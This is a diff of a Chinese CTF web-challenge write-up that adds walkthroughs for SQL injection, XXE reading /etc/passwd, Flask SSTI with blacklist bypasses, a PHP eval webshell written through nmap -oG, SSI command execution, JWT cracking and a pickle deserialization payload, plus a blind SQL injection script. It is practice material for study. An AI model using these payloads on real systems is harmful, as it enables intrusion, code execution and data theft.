@@ -4275,6 +4275,22 @@ if __name__ == '__main__':
 
 ### [WUSTCTF2020]朴实无华
 
+![image-20210606125534890](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606125534890.png)
+
+在robots.txt中发现了一个php文件，访问他没有发现异常
+
+![image-20210606125637727](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606125637727.png)
+
+抓包访问该文件，发现了下一步的PHP文件
+
+![image-20210606125848954](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606125848954.png)
+
+访问fl4g.php
+
+![image-20210606125934183](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606125934183.png)
+
+里面全是乱码，用Unicode编码得到下面的代码
+
 ~~~php
 <?php
 header('Content-type:text/html;charset=utf-8');
@@ -4320,6 +4336,40 @@ if (isset($_GET['get_flag'])){
 ?> 
 ~~~
 
+这个代码有三关，需要绕过num、md5、get_flag
+
++ num: `intval($num) < 2020 && intval($num + 1) > 2021`，使用科学计数法e来绕过，直接调用intval()函数，因为传递的是字符串，所以科学计数法的e会被忽略不显示，如果在调用intval()之前+1就会启用科学计数法变为2019000+1
+
+  ![image-20210606130737392](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606130737392.png)
+
++ md5：`$md5=$_GET['md5'];   if ($md5==md5($md5))`，某个字符串在md5之前与md5编码之后是一样的，由于是弱类型比较，所以只需要找到0eXXXXXX类似的字符串即可，他在MD5之后也是0eXXXXXXX类型的。
+
+  **注意，这里md5之后得到的0exxxxxx，需要注意的地方是，这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0。,如下所示**
+
+  ![image-20210606135111769](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606135111769.png)
+
+使用python脚本
+
+~~~python
+import hashlib
+
+for i in range(999999999):
+    s = str(i)
+    md5 = hashlib.md5(("0e"+s).encode('utf-8')).hexdigest()
+    # print(md5[:2])
+    if(md5[:2]=='0e'):
+        print('0e'+str(i))
+        break
+
+print(hashlib.md5(("0e141").encode('utf-8')).hexdigest())//得到0e141
+~~~
+
++ get_flag：获取文件
+
+  ![image-20210606140014890](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606140014890.png)
+
+  接下来就是读取此文件中的内容，代码中过滤了空格和cat 我们可以使用 `${IFS}、$IFS$1、<和tac、ca\t、sort`绕过
+
 payload：
 
 ~~~
@@ -4332,11 +4382,109 @@ payload：
 
 ### [SWPU2019]Web1
 
-https://www.jianshu.com/p/dc9af4ca2d06
+![image-20210606140603948](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606140603948.png)
 
-![image-20210531151756398](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531151756398.png)
+先注册账号并登录，进去只有个申请发布广告的功能
 
-![image-20210531153628563](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531153628563.png)
+![image-20210606140634802](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606140634802.png)![image-20210606140707803](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606140707803.png)
+
+怀疑是否存在SQL注入，用SQL语句试试。
+
+![image-20210606140812308](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606140812308.png)
+
+点击广告详情并没有什么反应，看看代码，在代码中看到了连接，手动在地址栏输入访问
+
+![image-20210606140915266](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606140915266.png)
+
+果然存在SQL注入，报了语法错误
+
+![image-20210606141010884](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606141010884.png)
+
+接下来我们就是尝试爆破数据库中的一些信息。过滤了 `and or order # 空格`
+
+我们直接使用union select 来查询列数，使用/**/来绕过空格，使用'代替注释
+
+![image-20210606141518250](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606141518250.png)
+
+![image-20210606141507805](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606141507805.png)
+
+并不是4列，最终获取出来列数是22，2和3的位置回显信息
+
+![image-20210606141725852](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606141725852.png)
+
+
+
+获取数据库信息
+
+![image-20210606141841655](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606141841655.png)
+
+
+
+开始获取数据库中的表信息：
+
+好像or被过滤了，不能使用information_schema数据库了，只能换个办法获取数据库信息了。https://www.anquanke.com/post/id/193512这篇文章讲了information_schema库被限制之后，还有哪些思路
+
+仔细想想，information_schema在注入中不可或缺的原因无非是因为它包含了所有其他数据库的信息，主要是table_schema，table_name.column_name等等。那么有没有具有类似功能的存在呢？文章中提供了一种解法:`sys.schema_auto_increment_columns`该视图的作用就是用来对表自增ID的监控。如果表中存在自增id,那么这个视图就会包含这一 表。
+
+下面是我本地数据库的演示，含有自增id的数据库和其中的表都显示出来了。
+
+![image-20210606143042513](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606143042513.png)
+
+利用上述代码获取数据库中的表：
+
+~~~
+1'union/**/select/**/1,(select/**/group_concat(table_name)from(sys.schema_auto_increment_columns)where(table_schema="web1")),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+~~~
+
+![image-20210606144645078](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606144645078.png)
+
+显示这张表不存在，原来buu用的是mariadb,没有这张表。所以可以用其他的表来替代。
+
+MariaDB：`mysql.innodb_table_stats`用于报表名-->select group_concat(table_name) from mysql.innodb_table_stats where database_name=库名
+
+获取表名payload：
+
+~~~
+1'//union//select//1,(select//group_concat(table_name)from(mysql.innodb_table_stats)where(database_name="web1")),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
+~~~
+
+
+
+接下来由于不知道列名，引入一个以前自己不怎么熟悉的点：无列名注入，这里看到一篇文章讲的很准确：
+
+![image-20210606150848175](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606150848175.png)
+
+接下来就是获取表中的字段名
+
+无列名注入，参考[CTF|mysql之无列名注入](https://zhuanlan.zhihu.com/p/98206699)
+
+![image-20210606151353270](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606151353270.png)
+
+其中未知的列名被替换成了数字，也就是说，我们可以继续数字来对应列，如 2 对应了表里面的 username：
+
+~~~sql
+SELECT `2` from (SELECT 1,2,3 union select * from `security`.users)a
+~~~
+
+![image-20210606151547725](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606151547725.png)
+
+> 末尾的a可以是任意字符，用于命名
+
+当然，多数情况下，\` 会被过滤。当  它不能使用的时候，使用别名来代替：
+
+~~~sql
+SELECT b from (SELECT 1,2 as b,3 union select * from `security`.users)a
+~~~
+
+![image-20210606151755143](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606151755143.png)
+
+同时查询多个列：
+
+~~~sql
+SELECT CONCAT(`2`,0x7e,`3`) from (SELECT 1,2,3 union select * from `security`.users)a
+~~~
+
+![image-20210606151941008](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606151941008.png)
 
 payload：
 
@@ -4354,7 +4502,22 @@ payload：
 
 ### [NCTF2019]True XML cookbook
 
-考察用xxe去攻击内网
+通过抓包发现存在XXE漏洞
+
+![image-20210606154122241](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606154122241.png)
+
+可以利用xml的外部实体引用去获取服务器内部的一些信息
+
+~~~xml-dtd
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE user[
+			<!ENTITY aaa SYSTEM "file:///etc/passwd">
+]>
+~~~
+
+![image-20210606154435026](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606154435026.png)
+
+利用php://filter伪协议获取PHP文件内容，但是并没有什么发现
 
 ![image-20210601174731955](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601174731955.png)
 
@@ -4396,19 +4559,29 @@ echo $result;
 
 https://blog.csdn.net/SopRomeo/article/details/107491606
 
-`file:///etc/hosts`
+接下来利用XXE打内网
 
-`file:///proc/net/arp`
+`file:///etc/hosts` 读取/etc/host,查看存活主机
+
+
 
 ![image-20210601185737945](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601185737945.png)
 
+`file:///proc/net/arp`查看eth0网卡所属的网段信息
+
 ![image-20210601195954013](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601195954013.png)
+
+使用intruder模块爆破网段
+
+![image-20210606155401743](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606155401743.png)
 
 ![image-20210601195923391](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601195923391.png)
 
 
 
 ### [NPUCTF2020]ReadlezPHP
+
+在源码中获取了一个php网页地址，访问这个地址获得下面的源码
 
 
 
@@ -4460,6 +4633,8 @@ payload：
 
 ### [WesternCTF2018]shrine
 
+打开页面就是下面的代码
+
 ~~~php
 
 import flask
@@ -4491,9 +4666,28 @@ if __name__ == '__main__':
 
 ~~~
 
-考察的是SSTI模板注入
+考察的是python的模板注入，并且限制了（）和两个关键字
 
 ![image-20210602123836022](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210602123836022.png)
+
+上面有代码提示flag在config中，咱们可以绕过限制去获取flag值，python还有一些内置函数，比如url_for和get_flashed_messages
+
++ url_for() ---- 一般我们通过一个url即可执行到一个函数，如果知道一个函数，如何去获得url呢？url_for函数可以实现这个功能。url_for() 接收两个及两个以上的参数，以函数名作为第一个参数，后面的参数是url的命名规则
++ get_flashed_messages() ---- 返回之前在Flask中通过 flash() 传入的闪现信息列表在渲染模板时，不需要手动分配
++ 可以直接在 模板 中使用的 模板变量 及 函数：config、request、url_for()、get_flashed_messages()
+  
+
+~~~
+/shrine/{{url_for.__globals__}}
+~~~
+
+![image-20210606161044052](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606161044052.png)
+
+
+
+~~~
+/shrine/{{url_for.__globals__['current_app'].config}}
+~~~
 
 
 
@@ -4626,7 +4820,17 @@ nmap有个参数 `-oG`是保存内容到一个文件中的，本题可以使用�
 </script>
 ~~~
 
+payload:
 
+~~~
+' <?= @eval($_POST[pass]);?> -oG 1.phtml '
+~~~
+
+过滤了php,使用phtml后缀绕过
+
+![image-20210606162032019](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606162032019.png)
+
+![image-20210606162646857](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606162646857.png)
 
 和以前做过的Online Tool题目套路一样
 
@@ -4708,6 +4912,13 @@ else{
 > __invoke()   当脚本尝试将对象调用为函数时触发
 
 https://blog.csdn.net/weixin_43952190/article/details/106016260
+
++ 根据以上题目，当用get方法传一个pop参数后，会自动调用Show类的\_wakeup()魔术方法。
++ \_\_wakeup()通过preg_match()将$this->source做字符串比较，如果$this->source是Show类，就调用了\_\_toString()方法；
++ 如果\_\_toString()其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的\_\_get()方法。
++ 如果\_\_get()中的p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的\_\_invoke()方法。
++ 利用文件包含漏洞，使用_invoke()读取flag.php的内容。
+  
 
 payload:
 
@@ -4835,6 +5046,12 @@ for i in range(10000000000):
 
 这三个字段信息肯定有可以利用的地方，先试试XFF字段，看看是否有SQL注入或者SSTI，很失望并不存在相关漏洞，看了别人的WP才知道原来是shtml后缀存在`SSI` 远程命令执行漏洞
 
+payload:
+
+~~~
+<!--#exec cmd="命令"-->
+~~~
+
 
 
 ![image-20210603195102156](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603195102156.png)
@@ -4884,7 +5101,7 @@ hint文件注释：提示PIN，没太懂什么意思
 
 ![image-20210604111527985](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210604111527985.png)
 
-看了别人的WP发现，最后的漏洞点和上面的两个信息并没有什么关系。原来是Flask框架的SSTI漏洞利用，故意在decode解码输入无法解开的字母，就会产生错误信息
+看了别人的WP发现，原来是Flask框架的SSTI漏洞利用，故意在decode解码输入无法解开的字母，就会产生错误信息
 
 ![image-20210604112931832](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210604112931832.png)
 
@@ -4912,7 +5129,876 @@ def decode():
 
 根据上述代码，发现了SSTI漏洞，还有一个waf方法，估计下面得绕过waf方法
 
+这个是python3版本，flask框架的ssti
+
+base64编码：
+
+![image-20210606185313613](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606185313613.png)
+
+base64解码：竟然被过滤了
+
+![image-20210606185400405](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606185400405.png)
+
+读取app.py源码
+
+payload：
+
+~~~python
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()")}}{% endif %}{% endfor %}
+~~~
+
+~~~
+from flask import Flask,render_template_string
+from flask import render_template,request,flash,redirect,url_for
+from flask_wtf import FlaskForm
+from wtforms import StringField, SubmitField
+from wtforms.validators import DataRequired
+from flask_bootstrap import Bootstrap
+import base64
+
+app = Flask(__name__)
+app.config[&amp;#39;SECRET_KEY&amp;#39;] = &amp;#39;s_e_c_r_e_t_k_e_y&amp;#39;
+bootstrap = Bootstrap(app)
+
+class NameForm(FlaskForm):
+    text = StringField(&amp;#39;BASE64加密&amp;#39;,validators= [DataRequired()])
+    submit = SubmitField(&amp;#39;提交&amp;#39;)
+class NameForm1(FlaskForm):
+    text = StringField(&amp;#39;BASE64解密&amp;#39;,validators= [DataRequired()])
+    submit = SubmitField(&amp;#39;提交&amp;#39;)
+
+def waf(str):
+    black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;,
+                  &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]
+    for x in black_list :
+        if x in str.lower() :
+            return 1
+
+
+@app.route(&amp;#39;/hint&amp;#39;,methods=[&amp;#39;GET&amp;#39;])
+def hint():
+    txt = &amp;#34;失败乃成功之母！！&amp;#34;
+    return render_template(&amp;#34;hint.html&amp;#34;,txt = txt)
+
+
+@app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;])
+def encode():
+    if request.values.get(&amp;#39;text&amp;#39;) :
+        text = request.values.get(&amp;#34;text&amp;#34;)
+        text_decode = base64.b64encode(text.encode())
+        tmp = &amp;#34;结果  :{0}&amp;#34;.format(str(text_decode.decode()))
+        res =  render_template_string(tmp)
+        flash(tmp)
+        return redirect(url_for(&amp;#39;encode&amp;#39;))
+
+    else :
+        text = &amp;#34;&amp;#34;
+        form = NameForm(text)
+        return render_template(&amp;#34;index.html&amp;#34;,form = form ,method = &amp;#34;加密&amp;#34; ,img = &amp;#34;flask.png&amp;#34;)
+
+@app.route(&amp;#39;/decode&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;])
+def decode():
+    if request.values.get(&amp;#39;text&amp;#39;) :
+        text = request.values.get(&amp;#34;text&amp;#34;)
+        text_decode = base64.b64decode(text.encode())
+        tmp = &amp;#34;结果 ： {0}&amp;#34;.format(text_decode.decode())
+        if waf(tmp) :
+            flash(&amp;#34;no no no !!&amp;#34;)
+            return redirect(url_for(&amp;#39;decode&amp;#39;))
+        res =  render_template_string(tmp)
+        flash( res )
+        return redirect(url_for(&amp;#39;decode&amp;#39;))
+
+    else :
+        text = &amp;#34;&amp;#34;
+        form = NameForm1(text)
+        return render_template(&amp;#34;index.html&amp;#34;,form = form, method = &amp;#34;解密&amp;#34; , img = &amp;#34;flask1.png&amp;#34;)
+
+
+@app.route(&amp;#39;/&amp;lt;name&amp;gt;&amp;#39;,methods=[&amp;#39;GET&amp;#39;])
+def not_found(name):
+    return render_template(&amp;#34;404.html&amp;#34;,name = name)
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+    app.run(host=&amp;#34;0.0.0.0&amp;#34;, port=5000, debug=True)
+
+
+~~~
+
+waf黑名单：
+
+~~~python
+def waf(str):
+    black_list = ["flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"] 
+    for x in black_list : 
+        if x in str.lower() :
+            return 1
+
+~~~
+
+那么我们可以利用**字符串拼接**找目录与执行命令。
+ 扫描根目录/：
+
+~~~python
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
+~~~
+
+![image-20210606191445511](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606191445511.png)
+
+
+
+发现了this_is_the_flag.txt
+读取this_is_the_flag.txt：
+由于waf过滤了flag，所以我们对“flag”进行拼接：
+
+```python
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
+```
+
+或者使用列表把this_is_the_flag.txt倒转读取
+
+~~~python
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read()}}{% endif %}{% endfor %}
+~~~
+
+
+
+得到flag：
+
+
+![image-20210606191545039](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606191545039.png)
+
+### [CISCN2019 华北赛区 Day1 Web2]ikun
+
+![image-20210605203325092](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605203325092.png)
+
+提示找到V6，写个python脚本跑一下找到v6
+
+~~~python
+import requests,time
+
+for i in range(200):
+    url = 'http://9f73c34e-337f-4bf8-a5d0-a9e240b48c23.node3.buuoj.cn/shop?page='+str(i)
+
+    resp = requests.get(url=url)
+    page_content = resp.text
+    time.sleep(0.3)
+    # print(page_content)
+    print(f'正在第{i}页查找中……')
+    if 'lv6.png' in page_content:
+        print("找到v6了，在第"+str(i)+"页")
+        pass
+~~~
+
+
+
+使用脚本成功在181页找到v6
+
+![image-20210605204527451](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605204527451.png)
+
+点击购买显示被禁止，抓包看看，v6的价格很高，应该自己没有注册账号，而且账号里面只有1000金币
+
+
+
+![image-20210605204957715](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605204957715.png)
+
+![image-20210605205055176](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605205055176.png)
+
+在数据包中发现了打折的数据，优惠20%在数据包中就是显示0.8，我们修改数据，让1000金币可以买的到v6就可以了
+
+![image-20210605205840340](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605205840340.png)
+
+访问该页面，显示只有admin可以访问，看到了JWT，可以修改JWT数据来修改成admin权限
+
+![image-20210605205932071](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605205932071.png)
+
+使用`c-jwt-cracker`工具破解出密钥是“1Kun”，并把用户名改为admin,生成新的JWT，
+
+![image-20210606195049928](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210606195049928.png)
+
+![image-20210605213706530](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605213706530.png)成功进入，查看源码发现了源代码文件，下载下来
+
+![image-20210605213722036](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605213722036.png)
+
+下面没有思路了，对python代码审计经验不多。查看别人的wp说存在序列化漏洞
+
+Admin.py里面有反序列化操作,python反序列化以前没有遇到过
+
+admin.py
+
+~~~python
+import tornado.web
+from sshop.base import BaseHandler
+import pickle
+import urllib
+
+
+class AdminHandler(BaseHandler):
+    @tornado.web.authenticated
+    def get(self, *args, **kwargs):
+        if self.current_user == "admin":
+            return self.render('form.html', res='This is Black Technology!', member=0)
+        else:
+            return self.render('no_ass.html')
+
+    @tornado.web.authenticated
+    def post(self, *args, **kwargs):
+        try:
+            become = self.get_argument('become')
+            p = pickle.loads(urllib.unquote(become))
+            return self.render('form.html', res=p, member=1)
+        except:
+            return self.render('form.html', res='This is Black Technology!', member=0)
+
+~~~
+
+> p = pickle.loads(urllib.unquote(become))
+>
+> urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 & key2 = value2的形式
+> pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回
+
+我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的\_\_reduce__ python魔术方法会在该类被反序列化的时候会被调用
+
+当\__reduce__被定义之后，该对象被Pickle时就会被调用
+
+我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们
+
+供eval使用的即打开的文件flag.txt
+
+反序列化payload:
+
+~~~python
+import pickle
+import urllib
+
+class payload(object):
+    def __reduce__(self):
+       return (eval, ("open('/flag.txt','r').read()",))
+
+a = pickle.dumps(payload())
+a = urllib.quote(a)
+print a
+
+
+~~~
+
+
+
+![image-20210605214633602](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605214633602.png)
+
+![image-20210605214621038](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210605214621038.png)
+
+pickle序列化：
+
+> pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。
+>
+> pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，
+> pickle序列化后的数据，可读性差，人一般无法识别。
+>
+> 
+
+```
+Pickle模块中最常用的函数为：
+
+（1）pickle.dump(obj, file, [,protocol])
+
+        函数的功能：将obj对象序列化存入已经打开的file中。
+
+       参数讲解：
+
+    obj：想要序列化的obj对象。
+    file:文件名称。
+    protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
+
+（2）pickle.load(file)
+
+        函数的功能：将file中的对象序列化读出。
+
+        参数讲解：
+
+    file：文件名称。
+
+（3）pickle.dumps(obj[, protocol])
+
+       函数的功能：将obj对象序列化为string形式，而不是存入文件中。
+
+       参数讲解：
+
+    obj：想要序列化的obj对象。
+    protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
+
+（4）pickle.loads(string)
+
+       函数的功能：从string中读出序列化前的obj对象。
+
+       参数讲解：
+
+    string：需要序列化读出的字符串。
+```
+
+```
+    【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。
+```
+
+官方文档中说过，pickle是个不安全的模块，永远别去反序列化不信任的数据。
+
+这一切都是因为**reduce** 魔术方法，它在序列化的时候会完全改变被序列化的对象，这个方法相当的强大，官方建议不要直接操作这个方法。
+
+### [WUSTCTF2020]颜值成绩查询
+
+存在SQL盲注，并且过滤了空格
+
+![image-20210607193928878](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210607193928878.png)
+
+
+
+![image-20210607193916226](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210607193916226.png)
+
+使用python脚本：
+
+~~~python
+import sys
+import time
+
+import requests
+
+def getPayload(result_index, char_index, ascii):
+    # 附加url
+    start_str = "0^"
+    end_str = ""
+    # 自定义SQL查询语句
+    # select_str="select(version())" #limit "+ str(result_index) + ",1" 显示数据库、版本、用户名
+    # 查询所有数据库名
+    # select_str="select(group_concat(schema_name))from(information_schema.schemata)"#limit "+ str(result_index) + ",1"
+    # 查询特定数据库中的所有表名
+    # select_str="select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')"# limit "+str(result_index)+",1"
+    # 查询数据库的表的列名
+    # select_str= "select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')"# limit " + str(result_index) + ",1"
+    # 查询特定数据库特定表中内容
+    select_str="select(SUBSTRING((group_concat(flag,0x7e,value)),1))from(ctf.flag)"#limit "+str(result_index)+",1"
+    # 连接payload
+    sqli_str = "(ascii(substr((" + select_str + ")," + str(char_index) + ",1))>" + str(ascii) + ")"
+    payload = start_str + sqli_str + end_str
+    # print(payload)
+    return payload
+
+def execute(result_index, char_index, ascii):
+    # 连接url
+    url = "http://f2d1be60-55c3-479c-829e-a54d1cfbfc19.node3.buuoj.cn/?stunum="
+    exec_url = url + getPayload(result_index, char_index, ascii)
+    # print(exec_url)
+    # 检查回显
+    echo = "Hi admin, your score is: 100"
+    content = requests.get(exec_url).text
+    time.sleep(0.2)
+    if echo in content:
+        return True
+    else:
+        return False
+
+
+def dichotomy(result_index, char_index, left, right):
+    while left < right:
+        # 二分法
+        ascii = int((left + right) / 2)
+        if execute(str(result_index), str(char_index + 1), str(ascii)):
+            left = ascii
+        else:
+            right = ascii
+        # 结束二分
+        if left == right - 1:
+            if execute(str(result_index), str(char_index + 1), str(ascii)):
+                ascii += 1
+                break
+            else:
+                break
+    return chr(ascii)
+
+
+if __name__ == "__main__":
+    for num in range(32):  # 查询结果的数量
+        count = 0
+        for len in range(1000):  # 单条查询结果的长度
+            count += 1
+            char = dichotomy(num, len, 30, 126)
+            if ord(char) == 31:  # 单条查询结果已被遍历
+                break
+            sys.stdout.write(char)
+            sys.stdout.flush()
+        if count == 1:  # 查询结果已被遍历
+            break
+        sys.stdout.write("\r\n")
+        sys.stdout.flush()
+
+~~~
+
+获取当前数据库名称：
+
+~~~mysql
+0^(ascii(substr((select(database())),{},1))>{})
+~~~
+
+![image-20210607194439553](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210607194439553.png)
+
+获取所有数据库的名称：
+
+~~~mysql
+0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{},1))>{})
+~~~
+
+![image-20210607195103862](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210607195103862.png)
+
+
+
+获取数据库中所有表：
+
+~~~mysql
+0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{},1))>{})
+~~~
+
+![image-20210607195231830](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210607195231830.png)
+
+获取ctf.flag表中的所有字段：
+
+~~~mysql
+0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))>{})
+~~~
+
+![image-20210607195355811](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210607195355811.png)
+
+获取ctf.flag表中的所有内容：
+
+~~~mysql
+0^(ascii(substr((select(SUBSTRING((group_concat(flag,0x7e,value)),1))from(ctf.flag)),{},1))>{})
+~~~
+
+![image-20210607195749205](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210607195749205.png)
+
+成功获得flag
+
+### [强网杯 2019]Upload
+
+先注册一个账号，再登陆
+
+![image-20210609111523422](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210609111523422.png)
+
+
+
+![image-20210609112927339](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210609112927339.png)
+
+![image-20210609112919210](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210609112919210.png)
+
+### [BSidesCF 2019]Futurella
+
+flag就是首页注释中，略过
+
+### [CISCN2019 华北赛区 Day1 Web1]Dropbox
+
+先注册登录
+
+![image-20210609191151614](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210609191151614.png)
+
+![image-20210609191212696](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210609191212696.png)
+
+~~~php
+<?php //index.php代码
+session_start();
+if (!isset($_SESSION['login'])) {
+    header("Location: login.php");
+    die();
+}
+?>
+
+
+<!DOCTYPE html>
+<html>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>网盘管理</title>
+
+<head>
+    <link href="static/css/bootstrap.min.css" rel="stylesheet">
+    <link href="static/css/panel.css" rel="stylesheet">
+    <script src="static/js/jquery.min.js"></script>
+    <script src="static/js/bootstrap.bundle.min.js"></script>
+    <script src="static/js/toast.js"></script>
+    <script src="static/js/panel.js"></script>
+</head>
+
+<body>
+    <nav aria-label="breadcrumb">
+    <ol class="breadcrumb">
+        <li class="breadcrumb-item active">管理面板</li>
+        <li class="breadcrumb-item active"><label for="fileInput" class="fileLabel">上传文件</label></li>
+        <li class="active ml-auto"><a href="#">你好 <?php echo $_SESSION['username']?></a></li>
+    </ol>
+</nav>
+<input type="file" id="fileInput" class="hidden">
+<div class="top" id="toast-container"></div>
+
+<?php
+include "class.php";
+
+$a = new FileList($_SESSION['sandbox']);
+$a->Name();
+$a->Size();
+?>
+~~~
+
+`class.php代码`：
+
+~~~php
+<?php
+error_reporting(0);
+$dbaddr = "127.0.0.1";
+$dbuser = "root";
+$dbpass = "root";
+$dbname = "dropbox";
+$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
+
+class User {
+    public $db;
+
+    public function __construct() {
+        global $db;
+        $this->db = $db; //序列化知识
+    }
+
+    public function user_exist($username) {
+        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->store_result();
+        $count = $stmt->num_rows;
+        if ($count === 0) {
+            return false;
+        }
+        return true;
+    }
+
+    public function add_user($username, $password) {
+        if ($this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
